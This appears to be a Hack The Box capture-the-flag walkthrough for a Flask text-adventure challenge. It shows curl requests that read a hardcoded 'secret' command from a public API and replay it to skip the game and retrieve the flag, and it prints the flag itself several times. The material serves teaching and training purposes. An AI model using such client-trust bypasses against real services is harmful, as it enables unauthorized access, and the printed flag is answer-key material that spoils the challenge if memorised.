# FLAG_COMMAND - HTB CTF Walkthrough

| Field | Value |
|---|---|
| Challenge type | Web application |
| Tech stack | Werkzeug/Flask backend, vanilla JS frontend |
| Flag location | Returned directly in a JSON API response |
| Vulnerability chain | Client-side logic exposes a hardcoded server-side bypass command |
| Flag | `HTB{D3v3l0p3r_t00l5_4r3_b35t__t0015_wh4t_d0_y0u_Th1nk??}` |

---

## Key Technologies - What They Are

**Flask / Werkzeug** - Python's lightweight web framework and the WSGI server underneath it. Here it serves both the static frontend and a small JSON API (`/api/options`, `/api/monitor`) that drives the game.

**Client-side state machine** - The entire "maze" is implemented in the browser's JavaScript (`main.js`, `commands.js`, `game.js`). The frontend tracks the player's current step and decides which typed commands are valid at that step by checking them against a list fetched from the server.

---

## Architecture

```
[Browser] ──→ GET /            (serves index.html + JS bundle)
           ──→ GET /api/options (returns per-step valid commands as JSON)
           ──→ POST /api/monitor {"command": "..."} (submits a command, gets a response)
```

The app presents itself as a typed text-adventure: "wake up in a forest maze," pick from numbered options, navigate a small state machine (`currentStep` 1-4) toward some ending.

---

## Vulnerability Chain Summary

```
Step 1: Load the page, pull the JS bundles directly (curl main.js)
Step 2: Find CheckMessage() in main.js accepts a command if it matches
        the CURRENT step's options OR a special 'secret' key - checked
        with no session/step validation server-side
Step 3: GET /api/options and read the 'secret' array in the raw JSON -
        it contains a hardcoded phrase
Step 4: POST that phrase straight to /api/monitor - flag returned
        immediately, no maze traversal required
```

---

## Bug - Hardcoded Bypass Command Shipped to the Client

**File:** `main.js`

### How command validation works

```javascript
async function CheckMessage() {
    fetchingResponse = true;
    currentCommand = commandHistory[commandHistory.length - 1];

    if (availableOptions[currentStep].includes(currentCommand) || availableOptions['secret'].includes(currentCommand)) {
        await fetch('/api/monitor', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 'command': currentCommand })
        })
        ...
```

The frontend only lets a typed command through to `/api/monitor` if it appears in `availableOptions[currentStep]` (the four options for whatever step the player is on) **or** in `availableOptions['secret']`. That second condition is the bug: a "secret" bypass command is accepted at any step, regardless of maze progress.

### Where `availableOptions` comes from

```javascript
const fetchOptions = () => {
    fetch('/api/options')
        .then((data) => data.json())
        .then((res) => {
            availableOptions = res.allPossibleCommands;
        })
        .catch(() => {
            availableOptions = undefined;
        })
}
```

`availableOptions` is just the raw JSON body of `GET /api/options`. Nothing is hidden from the client - the full command list, including the `secret` key, ships in plaintext to anyone who requests that endpoint:

```bash
curl http://<target>/api/options
```

```json
{
  "allPossibleCommands": {
    "1": ["HEAD NORTH", "..."],
    "2": ["..."],
    "3": ["..."],
    "4": ["..."],
    "secret": ["Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"]
  }
}
```

### Why this matters

The server-side handler behind `/api/monitor` trusts whatever command the client sends without checking that the player actually reached the corresponding step. Since the bypass phrase is baked into a public API response, the entire maze - all four steps of forest/nymph/wizard flavor text - is entirely optional. There is no session state, no step counter, and no rate limiting enforced server-side; the JS state machine is purely cosmetic.

### Exploitation

Skip the game UI entirely and send the secret phrase directly:

```bash
curl -X POST http://<target>/api/monitor \
  -H 'Content-Type: application/json' \
  -d '{"command":"Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}'
```

Response:

```json
{"message": "HTB{D3v3l0p3r_t00l5_4r3_b35t__t0015_wh4t_d0_y0u_Th1nk??}"}
```

---

## Root Cause

Classic "security through client-side obscurity": the maze's rules (including the intended debug/skip command) are enforced only in JavaScript that ships to the browser, and the data driving those rules is fetched from an API that returns every possible command unfiltered. Any check that depends on a value the client can read is not a security boundary - the fix is to keep step state and the valid-command set server-side, and never expose a "secret" value in a public response.

---

## Flag

```
HTB{D3v3l0p3r_t00l5_4r3_b35t__t0015_wh4t_d0_y0u_Th1nk??}
```
